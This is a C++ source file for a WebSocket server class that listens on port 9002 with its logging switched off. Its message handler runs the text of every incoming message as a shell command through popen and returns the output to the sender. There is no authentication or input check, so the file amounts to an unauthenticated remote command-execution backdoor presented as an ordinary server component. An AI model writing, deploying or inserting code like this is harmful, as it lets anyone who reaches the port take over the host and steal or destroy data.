
#include "WebSocketServer.hpp"

#include <stdexcept>
#include <cstdio>   // for open and pclose

#if defined(_WIN32) || defined(_WIN64)
#define popen _popen
#define pclose _pclose
#endif


WebSocketServer::WebSocketServer() : m_running(false) {
    m_server.set_access_channels(websocketpp::log::alevel::none);
    m_server.set_error_channels(websocketpp::log::elevel::none);
    m_server.init_asio();
    m_server.set_message_handler(bind(&WebSocketServer::on_message, this, std::placeholders::_1, std::placeholders::_2));
}

WebSocketServer::~WebSocketServer() {
    stop();
}

void WebSocketServer::start() {
    if (!m_running) {
        m_server.listen(9002);
        m_server.start_accept();
        m_running = true;
        m_thread = std::thread(&WebSocketServer::run_server, this);
    }
}

void WebSocketServer::stop() {
    if (m_running) {
        m_server.stop();
        m_thread.join();
        m_running = false;
    }
}

void WebSocketServer::run_server(WebSocketServer* instance) {
    instance->m_server.run();
}

void WebSocketServer::execute_command(const std::string& cmd, std::string& result) {
    std::array<char, 128> buffer;
    std::shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
            result += buffer.data();
    }
}

void WebSocketServer::on_message(websocketpp::connection_hdl hdl, server::message_ptr msg) {
    std::string cmd = msg->get_payload();
    std::string result;

    try {
        execute_command(cmd, result);
    } catch (const std::exception& e) {
        result = "Error: ";
        result += e.what();
    }

    m_server.send(hdl, result, websocketpp::frame::opcode::text);
}